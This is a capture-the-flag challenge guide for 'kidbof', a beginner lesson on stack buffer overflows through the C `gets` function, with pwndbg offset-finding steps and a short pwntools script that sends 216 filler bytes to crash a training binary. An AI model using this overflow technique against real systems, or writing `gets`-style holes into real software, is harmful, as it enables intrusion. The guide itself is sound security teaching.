# Challenge Name
kidbof

## Learning Objective
Understand simple buffer overflow and `gets` vulnerability.

## Description 
Order me more pizzas.

## Difficulty:
Guided (Easy)

## Guide
Let's highlight the main points in the source code:

1. When a segmentation fault is triggered while binary is running, it will run the `pizza` function , which will read the flag
2. `burger` function is called, which asks for a input to be put in `order` variable which has a size of 200 bytes. 
3. It also has the vulnerable c function `gets`, which allows us to buffer overflow.

We can try to do this: 

#### To find the offset needed:
1. Open program with pwndbg
```shell
$> gdb chall
```

2. Generate the cyclic pattern of 300 bytes. This cyclic sequence helps uses to identify what address or how many bytes we want to overwrite. 

```shell
pwndbg> cyclic 300
aaaaaaaabaaaaaaacaaaa...
```

3. Run the program and paste when prompted
```shell
pwndbg> run
``` 

You should be able to observe this in the registers:
```shell
 RBP  0x6261616161616162 ('baaaaaab')
 RSP  0x7fffffffdc68 ◂— 'caaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa'
```

We just need the first 8 bytes in `RSP` because that tells how many bytes we need to completely overflow `saved RBP pointer address`

```shell
pwndbg> cyclic -l caaaaaab
Finding cyclic pattern of 8 bytes: b'caaaaaab' (hex: 0x6361616161616162)
Found at offset 216
```

### Solve script

1. Import the library
```python
from pwn import *
```

2. Depending on whether you want to solve locally or remotely, add either of the following:
```python
# local solve
p = process("./chall")

# remote solve
p = remote("IP", PORT)
```

3. Since we want to send 216 bytes of input:
```python
payload = b'A' * 216
p.sendline(payload)
```

4. Interact with the service
```python
p.interactive()
```

When we put all that together u should get this:
```python
from pwn import *

# local solve
# p = process("./chall")

# remote solve
p = remote("IP", PORT)

# payload 
payload = b'A' * 216

# send payload
p.sendline(payload)
p.interactive()
```

Run in your terminal to solve:
```shell
$> python3 script.py
```

## Solution
Refer to solve.py.

## Hints
1. What causes segmentation fault? 
2. Have you considered saved RBP address?

## Attached Files
- chall.c
- chall

## Resources
- http://ctf101.org

## Flag
TBD
